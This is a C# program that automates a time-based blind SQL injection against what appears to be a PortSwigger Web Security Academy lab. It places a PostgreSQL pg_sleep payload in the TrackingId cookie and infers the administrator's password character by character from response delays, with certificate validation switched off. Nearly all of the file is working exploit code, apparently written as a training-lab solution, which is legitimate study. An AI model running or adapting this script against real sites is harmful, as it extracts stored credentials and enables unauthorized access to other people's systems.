using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Text;
using System.Threading.Tasks;

namespace SQLBruter
{
    class Program
    {
        private static async Task<bool> BruteAsync(string guess, int placeholder)
        {
            var payload = $"QQBgscYu4K9Z4eUg'%3BSELECT+CASE+WHEN+(username='administrator'+AND+substring(password,1,{placeholder})='{guess}')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--";
            var session = "Wdxz5fiC0e3uq3Simx2LcPOz7VFiQRm9";

            // To proxy through Burp
            var proxy = new WebProxy
            {
                Address = new Uri($"http://127.0.0.1:8080"),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false,
            };

            var httpClientHandler = new HttpClientHandler
            {
                //Proxy = proxy, uncomment this line to burp the request
                UseCookies = false,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },

                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
            };

            var stopWatch = Stopwatch.StartNew();
            using (var httpClientReq = new HttpClient(httpClientHandler))
            {
                var httpReq = new HttpRequestMessage(HttpMethod.Get, $"https://ac5c1fd41e74a7c48025072100d20031.web-security-academy.net/");

                httpReq.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
                httpReq.Headers.Add("Accept-Language", "en-US,en;q=0.5");
                httpReq.Headers.Add("Accept-Encoding", "gzip, deflate");
                httpReq.Headers.Add("Cookie", $"TrackingId={payload}; session={session}");

                var httpRes = await httpClientReq.SendAsync(httpReq);
            }
            var totalTime = stopWatch.ElapsedMilliseconds;
            //Console.WriteLine($"Total Time: {totalTime}"
            
            if (totalTime > 6500)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static void Main(string[] args)
        {
            string charset = "abcdefghijklmnopqrstuvwxyz0123456789";
            string pw = String.Empty;
            //List<char> passChars = new List<char>();

            for (int i = 0; i < 20; i++)
            {
                
                foreach (char c in charset)
                {
                    Console.Write($"Password: {pw}");
                    Console.Write(c);
                    bool result = BruteAsync(pw+c, i+1).GetAwaiter().GetResult();
                    if (result)
                    {
                        pw += c;
                        Console.Clear();
                        Console.Write($"Password: {pw}");
                        break;
                    }
                    else
                    {
                        Console.Clear();
                        Console.Write("\b");
                    }
                }
            }

            //Console.WriteLine($"Password: {pw}");
        }
    }
}
